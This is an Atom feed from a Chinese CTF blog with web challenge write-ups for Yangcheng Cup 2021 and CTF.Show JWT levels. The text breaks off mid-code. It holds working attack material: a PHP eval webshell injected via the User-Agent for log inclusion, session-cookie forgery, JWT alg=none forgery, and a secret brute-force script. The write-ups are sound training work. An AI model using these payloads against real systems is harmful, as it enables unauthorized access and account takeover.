<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>果果说</title>
  
  <subtitle>Guoguo&#39;s Blog</subtitle>
  <link href="https://guo.moe/atom.xml" rel="self"/>
  
  <link href="https://guo.moe/"/>
  <updated>2021-09-12T01:55:27.000Z</updated>
  <id>https://guo.moe/</id>
  
  <author>
    <name>Guoguo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>羊城杯2021-网络安全大赛 Web Writeup</title>
    <link href="https://guo.moe/archives/CTF-Yang-Cheng-Bei-2021-Web-WriteUp.html"/>
    <id>https://guo.moe/archives/CTF-Yang-Cheng-Bei-2021-Web-WriteUp.html</id>
    <published>2021-09-12T04:00:00.000Z</published>
    <updated>2021-09-12T01:55:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>签到完毕就算成功</p><h1 id="Checkin-Go"><a href="#Checkin-Go" class="headerlink" title="Checkin_Go"></a>Checkin_Go</h1><p>这题还真是够 checkin 的。。。</p><p>首先注意到，在main.go 这里，Go中的 randomChar 并没有设定随机种子，所以实际上是伪随机，程序开始时的 <code>cookie.NewStore(randomChar(16))</code> 其实是固定的。</p><p>在 loginGetHandler 这里，注意到有一句 <code>hsh := hashProof()</code> ，实际上是在此设定了登录所需的 hash。同时，我们再来看这个代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func hashProof() string &#123;</span><br><span class="line">hsh := md5.New()</span><br><span class="line">hsh.Write(randomChar(<span class="number">6</span>))</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, hsh.Sum(nil))[:<span class="number">6</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也是没有设定随机种子的，这就意味着我们可以对其进行猜测。比如网站给出的前缀是 <code>8240ba</code>，我们可以写这样一个小程序来碰撞。此处输出的是十六进制的字符串，我们在post的时候要注意把字符串进行 urlencode ，这里使用 %隔两个填充一次即可。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hsh := md5.New()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">hsh.Reset()</span><br><span class="line">str := randomChar(<span class="number">6</span>)</span><br><span class="line">hsh.Write(str)</span><br><span class="line">hash1 := fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, hsh.Sum(nil))</span><br><span class="line"><span class="keyword">if</span> hash2 := hash1[:<span class="number">6</span>]; hash2 == <span class="string">&quot;8240ba&quot;</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%x&quot;</span>, str)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，在 <code>auth := r.Group(&quot;/auth/&quot;,hashProofRequired())</code> 中有个判断，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> md5Hash(c.PostForm(<span class="string">&quot;hsh&quot;</span>))[:<span class="number">6</span>] != hsh &#123;</span><br><span class="line">fmt.Println(hsh)</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;wrong hash&quot;</span>)</span><br><span class="line">c.Abort()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要post的是hsh的原文而不是md5加密后的，所以我们上面才要进行urlencode。</p><p>这里并没有进行登录账号密码验证，但是限制非admin的验证，所以我们先随意用户登录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> uname == <span class="string">&quot;admin&quot;</span>&#123;</span><br><span class="line">c.String(<span class="number">200</span>,<span class="string">&quot;noon,you cant be admin&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> uname == <span class="string">&quot;&quot;</span> || <span class="built_in">pwd</span> == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;empty parameter&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登录完成后会跳转到 /game ，同时我们在 <code>guess.go/start()</code> 中将会获得flag以及player的money，并会写入到 <code>cookie: o</code> 中。</p><p>这里提供了 /add 来添加钱，不过实际上我们并不需要用到这个钱，而且这个钱是加在flag上的，很明显flag的钱够多了，我们不需要加在flag上。而且其中有一个 check 来检查，我们似乎无法直接修改其金钱。但是我们可以自己构造一个小程序，把 playerMoney 和 NowMoney 调换一下。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">r</span> := gin.Default()</span><br><span class="line">storage := cookie.NewStore(randomChar(<span class="number">16</span>))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;o&quot;</span>, storage))</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, func(c *gin.Context) &#123;</span><br><span class="line">s := sessions.Default(c)</span><br><span class="line">s.Set(<span class="string">&quot;uname&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">checkPlayerMoney := s.Get(<span class="string">&quot;checkPlayerMoney&quot;</span>)</span><br><span class="line">checkNowMoney := s.Get(<span class="string">&quot;checkNowMoney&quot;</span>)</span><br><span class="line">s.Set(<span class="string">&quot;checkNowMoney&quot;</span>, checkPlayerMoney)</span><br><span class="line">s.Set(<span class="string">&quot;checkPlayerMoney&quot;</span>, checkNowMoney)</span><br><span class="line">playerMoney := s.Get(<span class="string">&quot;playerMoney&quot;</span>)</span><br><span class="line">nowMoney := s.Get(<span class="string">&quot;nowMoney&quot;</span>)</span><br><span class="line">s.Set(<span class="string">&quot;nowMoney&quot;</span>, playerMoney)</span><br><span class="line">s.Set(<span class="string">&quot;playerMoney&quot;</span>, nowMoney)</span><br><span class="line">s.Save()</span><br><span class="line">&#125;)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:8081&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后拿到返回的 cookie，再传给线上环境，访问 /game 并购买 flag 得到 flag。</p><h1 id="only4"><a href="#only4" class="headerlink" title="only4"></a>only4</h1><p>我估计这题是个非预期解，，，</p><p>这题本质是想让你走反序列化的，但是拿到 webshell 以后上去一看，好家伙 serialize.php 这文件名谁能猜得出来？</p><p><code>include($gwht);</code> 中存在文件引用，</p><p>在 /var/www/example.com/log/access.log 中，或者 /proc/self/fd/8 可以获得访问日志，然后 User-Agent 改为 <code>&lt;?php eval($_POST[0]); ?&gt;</code> 即可实现一句话木马拿到 webshell 。flag 在根目录。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;签到完毕就算成功&lt;/p&gt;
&lt;h1 id=&quot;Checkin-Go&quot;&gt;&lt;a href=&quot;#Checkin-Go&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT.html</id>
    <published>2021-08-30T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>JWT 的解密可以在此处完成，同时 JWT 由三部分组成：Header，Payload以及Secret，前两部分由base64编码，并且三个部分用 . 进行拼接</p><p><a href="https://jwt.io/">JWT.IO</a></p><h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>JWT 的解码与使用</p></li><li><p>JWT 无密钥情况下可任意修改前方数据</p><span id="more"></span></li></ul><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>从 Cookie 中可获得 JWT 的数据，并放入 <a href="http://jwt.io/">jwt.io</a> 中</p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled.png" alt="Untitled"></p><p>由 alg:None ，我们可以知道该jwt无签名算法，我们可以任意修改数据。</p><p>但是这里编码后的jwt不知道为什么少了个.，在下一题缺少这个.又无法正常提交</p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%201.png" alt="Untitled"></p><p>右键查看源代码，发现有一个访问 /admin 的提示，但注意这里不应该访问 /admin而应该访问 /admin/ ，否则将会错误地跳转到 80 端口的页面导致404。</p><p><del>但是此题无法依照wp做出来，先跳过。。。</del></p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%202.png" alt="Untitled"></p><p>将捕获后的auth发送至Decoder，解码后修改sub字段为admin再编码，编码后的内容去除等于号再发送至Repeater覆盖进行访问获得flag。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程</a></p><p><a href="https://jwt.io/">JWT.IO</a></p><p><a href="https://xz.aliyun.com/t/2338"></a></p><h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>修改加密方式为none使其可以任意修改数据内容</li></ul><h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>将cookie中的jwt交由burpsuite解码，可以看见由三部分组成，分别为 Header.Content.Key</p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%203.png" alt="Untitled"></p><p>在此题中我们显然是没有办法直接拿到它的密钥的，但是在测试时，为了方便可以将加密方式设置为none，这样密钥设置为任何值都是可以，包括空值。</p><p><del>我们可以使用burpsuite来直接修改，将后面的key部分直接去除，然后再将中间段的sub将user改为admin即可</del></p><p>（测试了一下，发现上面这种方法并不可用）</p><p>我们还可以利用 Python 中的 pyjwt 库（使用 <code>pip install pyjwt</code> 来安装）来编码一段jwt串</p><p>从jwt中提取得到关键数据 Header <code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code>，Content <code>&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1630149052,&quot;exp&quot;:1630156252,&quot;nbf&quot;:1630149052,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;aeb0d5d3cb6eb7783cfb000aa990034f&quot;&#125;</code> 并用pycharm进行编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1630149052</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1630156252</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1630149052</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;aeb0d5d3cb6eb7783cfb000aa990034f&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>编码后输出 <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE0OTA1MiwiZXhwIjoxNjMwMTU2MjUyLCJuYmYiOjE2MzAxNDkwNTIsInN1YiI6ImFkbWluIiwianRpIjoiYWViMGQ1ZDNjYjZlYjc3ODNjZmIwMDBhYTk5MDAzNGYifQ.</code></p><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/solitudi/article/details/112525267">[CTFSHOW]JWT_Y4tacker的博客-CSDN博客_ctf jwt</a></p><h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>对称加密算法 HS256 密钥的爆破</li><li>Python strip 移除开头或结尾的字符，默认是空格或换行符</li></ul><h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>根据参考资料1，可通过报错来判定key是否有效</p><h3 id="通过-Python-脚本-常用密码破解"><a href="#通过-Python-脚本-常用密码破解" class="headerlink" title="通过 Python 脚本 + 常用密码破解"></a>通过 Python 脚本 + 常用密码破解</h3><blockquote><p>1.若签名直接校验失败，则 key_ 为有效密钥；<br>2.若因数据部分预定义字段错误<br>（jwt.exceptions.ExpiredSignatureError,<br>jwt.exceptions.InvalidAudienceError,<br>jwt.exceptions.InvalidIssuedAtError,<br>jwt.exceptions.InvalidIssuedAtError,<br>jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；<br>3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；<br>4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。<br>作者：littlebin404<br>链接：<a href="https://www.jianshu.com/p/acbb936e87df">https://www.jianshu.com/p/acbb936e87df</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><p>考虑到一般人可能会使用自己的各种密码进行设置，可以用 web21 提供的字典进行测试。</p><p>我们可以通过下列代码进行破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE1MTIyNSwiZXhwIjoxNjMwMTU4NDI1LCJuYmYiOjE2MzAxNTEyMjUsInN1YiI6InVzZXIiLCJqdGkiOiI5MzY0M2Y3YThkZTI4ZTdkZDEwZjk0MGY5M2JlYjQ3NyJ9.1FWDoI6Vhu3PSCUuGMvb0VX2SmGjqz02YFS-z-uJEeo&quot;</span> <span class="comment"># 题目中的 token</span></span><br><span class="line">password_file = <span class="string">&quot;/Users/kelly/Downloads/passwords.txt&quot;</span> <span class="comment"># 密码文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line.strip() <span class="comment"># 去除每行后面的换行</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(token, verify=<span class="literal">True</span>, key=line, algorithms=<span class="string">&quot;HS256&quot;</span>) <span class="comment"># 设置编码方式为 HS256</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key: &#x27;</span>, line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError</span><br><span class="line">                , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">                jwt.exceptions.ImmatureSignatureError): <span class="comment"># 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError: <span class="comment"># 签名错误则表示密钥不正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed: &quot;</span>, line)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%204.png" alt="Untitled"></p><h3 id="通过-jwt-cracker-进行破解"><a href="#通过-jwt-cracker-进行破解" class="headerlink" title="通过 jwt-cracker 进行破解"></a>通过 jwt-cracker 进行破解</h3><p>使用 BlackArch 或者 Kali 之类的，可以使用 jwt-cracker 进行全自动破解，但是速度较慢，命令为 jwt-cracker [jwt-token]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE1MTIyNSwiZXhwIjoxNjMwMTU4NDI1LCJuYmYiOjE2MzAxNTEyMjUsInN1YiI6InVzZXIiLCJqdGkiOiI5MzY0M2Y3YThkZTI4ZTdkZDEwZjk0MGY5M2JlYjQ3NyJ9<span class="number">.1</span>FWDoI6Vhu3PSCUuGMvb0VX2SmGjqz02YFS-z-uJEeo</span><br></pre></td></tr></table></figure><p>最后run出来密钥为 123456，可使用 web346 的代码重新合成一个 jwt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1630151225</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1630158425</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1630151225</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,  <span class="comment"># 记得改这里呀</span></span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;93643f7a8de28e7dd10f940f93beb477&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;123456&quot;</span>,  <span class="comment"># 这里输入之前破解得到的密钥</span></span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 这里改成和题目一样的 HS256</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/acbb936e87df">基于JWT的token弱密钥爆破</a></p><h1 id="其他资料"><a href="#其他资料" class="headerlink" title="其他资料"></a>其他资料</h1><p><a href="https://xz.aliyun.com/t/6776#toc-7">https://xz.aliyun.com/t/6776#toc-7</a></p><h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li>jwt-cracker 破解的使用</li></ul><h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%205.png" alt="Untitled"></p><p>使用 jwt-cracker 破解可得密码为 aaab</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1630160569</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1630167769</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1630160569</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;7a62ed74141fba98f405ca3fe23ebb91&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;aaab&quot;</span>,  <span class="comment"># 这里输入之前破解得到的密钥</span></span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 这里改成和题目一样的 HS256</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获得 token <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE2MDU2OSwiZXhwIjoxNjMwMTY3NzY5LCJuYmYiOjE2MzAxNjA1NjksInN1YiI6ImFkbWluIiwianRpIjoiN2E2MmVkNzQxNDFmYmE5OGY0MDVjYTNmZTIzZWJiOTEifQ.Ry2pggYXHznUje2KnM2In8Tku3RwuftuKIY3t4X3Hns</code></p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%206.png" alt="Untitled"></p><h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>node.js 中 Express 可通过 public 文件夹映射静态文件，从而下载</li></ul><h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.cookie(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.end(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.cookies.auth;</span><br><span class="line"><span class="keyword">var</span> cert = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.verify(auth, cert, <span class="function"><span class="keyword">function</span>(<span class="params">err, decoded</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.user===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.end(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>由题，我们可以得知其密钥存放于 /public/private.key，下载获得，并且编写 node.js 代码，注意需要提前安装好 jsonwebtoken 的 npm 包</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKeyPath = <span class="string">&quot;//Users//kelly//Downloads//private.key&quot;</span></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(privateKeyPath)</span><br><span class="line"><span class="keyword">var</span> token = 